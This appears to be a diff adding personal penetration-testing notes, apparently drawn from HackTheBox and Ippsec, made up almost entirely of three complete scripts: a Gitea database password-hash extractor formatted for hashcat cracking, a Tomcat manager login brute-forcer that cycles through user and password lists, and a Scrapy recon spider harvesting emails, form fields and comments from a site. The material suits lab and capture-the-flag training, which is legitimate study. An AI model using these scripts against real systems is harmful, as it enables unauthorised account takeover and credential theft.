@@ -1,0 +1,220 @@
+# Gittea password crack
+
+From Ippsec
+
+```python
+import sqlite3
+import base64
+import sys
+
+if len(sys.argv) != 2:
+    print("Usage: python3 gitea3hashcat.py <gitea.db>")
+    sys.exit(1)
+
+try:
+    con = sqlite3.connect(sys.argv[1])
+    cursor = con.cursor()
+    cursor.execute("SELECT name,passwd_hash_algo,salt,passwd FROM user")
+    for row in cursor.fetchall():
+        if "pbkdf2" in row[1]:
+            algo, iterations, keylen = row[1].split("$")
+            algo = "sha256"
+            name = row[0]
+        else:
+            raise Exception("Unknown Algorithm")
+        salt = bytes.fromhex(row[2])
+        passwd = bytes.fromhex(row[3])
+        salt_b64 = base64.b64encode(salt).decode("utf-8")
+        passwd_b64 = base64.b64encode(passwd).decode("utf-8")
+        print(f"{name}:{algo}:{iterations}:{salt_b64}:{passwd_b64}")
+except Exception as e:
+    print(f"Error: {e}")
+    sys.exit(1)
+# hashcat --username ./hash /usr/share/wordlists/rockyou.txt
+```
+
+# Tomcat-brute
+
+Script to brute force login tomcat, from HTB
+
+```python
+#!/usr/bin/python
+
+import requests
+from termcolor import cprint
+import argparse
+
+parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")
+
+parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
+parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
+parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
+parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")
+
+args = parser.parse_args()
+
+url = args.url
+uri = args.path
+users_file = args.usernames
+passwords_file = args.passwords
+
+new_url = url + uri
+f_users = open(users_file, "rb")
+f_pass = open(passwords_file, "rb")
+usernames = [x.strip() for x in f_users]
+passwords = [x.strip() for x in f_pass]
+
+cprint("\n[+] Atacking.....", "red", attrs = ['bold'])
+
+for u in usernames:
+    for p in passwords:
+        r = requests.get(new_url,auth = (u, p))
+
+        if r.status_code == 200:
+            cprint("\n[+] Success!!", "green", attrs = ['bold'])
+            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
+            break
+    if r.status_code == 200:
+        break
+
+if r.status_code != 200:
+    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
+    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
+#print r.status_code
+```
+
+# Reconspider
+
+Python script that spider and get some useful info like links, http comments, emails, etc
+
+From HTB. I am not sure if I will get copyrighted or sued for this lmao
+
+First `sudo apt install python3-scrapy`
+
+```python
+#! /usr/bin/python3
+import scrapy
+import json
+import re
+from urllib.parse import urlparse
+from scrapy.crawler import CrawlerProcess
+from scrapy.downloadermiddlewares.offsite import OffsiteMiddleware
+
+class CustomOffsiteMiddleware(OffsiteMiddleware):
+    def should_follow(self, request, spider):
+        if not self.host_regex:
+            return True
+        # This modification allows domains with ports
+        host = urlparse(request.url).netloc.split(':')[0]
+        return bool(self.host_regex.search(host))
+
+class WebReconSpider(scrapy.Spider):
+    name = 'ReconSpider'
+    
+    def __init__(self, start_url, *args, **kwargs):
+        super(WebReconSpider, self).__init__(*args, **kwargs)
+        self.start_urls = [start_url]
+        self.allowed_domains = [urlparse(start_url).netloc.split(':')[0]]
+        self.visited_urls = set()
+        self.results = {
+            'emails': set(),
+            'links': set(),
+            'external_files': set(),
+            'js_files': set(),
+            'form_fields': set(),
+            'images': set(),
+            'videos': set(),
+            'audio': set(),
+            'comments': set(),
+        }
+        
+    def parse(self, response):
+        self.visited_urls.add(response.url)
+
+        # Only process text responses
+        if response.headers.get('Content-Type', '').decode('utf-8').startswith('text'):
+            # Extract emails
+            emails = set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', response.text))
+            self.results['emails'].update(emails)
+        
+            # Extract links
+            links = response.css('a::attr(href)').getall()
+            for link in links:
+                if link.startswith('mailto:'):
+                    continue
+                parsed_link = urlparse(link)
+                if not parsed_link.scheme:
+                    link = response.urljoin(link)
+                if urlparse(link).netloc == urlparse(response.url).netloc:
+                    if link not in self.visited_urls:
+                        yield response.follow(link, callback=self.parse)
+                self.results['links'].add(link)
+        
+            # Extract external files (CSS, PDFs, etc.)
+            external_files = response.css('link::attr(href), a::attr(href)').re(r'.*\.(css|pdf|docx?|xlsx?)$')
+            for ext_file in external_files:
+                self.results['external_files'].add(response.urljoin(ext_file))
+        
+            # Extract JS files
+            js_files = response.css('script::attr(src)').getall()
+            for js_file in js_files:
+                self.results['js_files'].add(response.urljoin(js_file))
+        
+            # Extract form fields
+            form_fields = response.css('input::attr(name), textarea::attr(name), select::attr(name)').getall()
+            self.results['form_fields'].update(form_fields)
+        
+            # Extract images
+            images = response.css('img::attr(src)').getall()
+            for img in images:
+                self.results['images'].add(response.urljoin(img))
+        
+            # Extract videos
+            videos = response.css('video::attr(src), source::attr(src)').getall()
+            for video in videos:
+                self.results['videos'].add(response.urljoin(video))
+        
+            # Extract audio
+            audio = response.css('audio::attr(src), source::attr(src)').getall()
+            for aud in audio:
+                self.results['audio'].add(response.urljoin(aud))
+            
+            # Extract comments
+            comments = response.xpath('//comment()').getall()
+            self.results['comments'].update(comments)
+        else:
+            # For non-text responses, just collect the URL
+            self.results['external_files'].add(response.url)
+        
+        self.log(f"Processed {response.url}")
+
+    def closed(self, reason):
+        self.log("Crawl finished, converting results to JSON.")
+        # Convert sets to lists for JSON serialization
+        for key in self.results:
+            self.results[key] = list(self.results[key])
+        
+        with open('results.json', 'w') as f:
+            json.dump(self.results, f, indent=4)
+
+        self.log(f"Results saved to results.json")
+
+def run_crawler(start_url):
+    process = CrawlerProcess(settings={
+        'LOG_LEVEL': 'INFO',
+        'DOWNLOADER_MIDDLEWARES': {
+            '__main__.CustomOffsiteMiddleware': 500,
+        }
+    })
+    process.crawl(WebReconSpider, start_url=start_url)
+    process.start()
+
+if __name__ == "__main__":
+    import argparse
+    
+    parser = argparse.ArgumentParser(description="ReconSpider")
+    parser.add_argument("start_url", help="The starting URL for the web crawler")
+    args = parser.parse_args()
+    
+    run_crawler(args.start_url)
+```
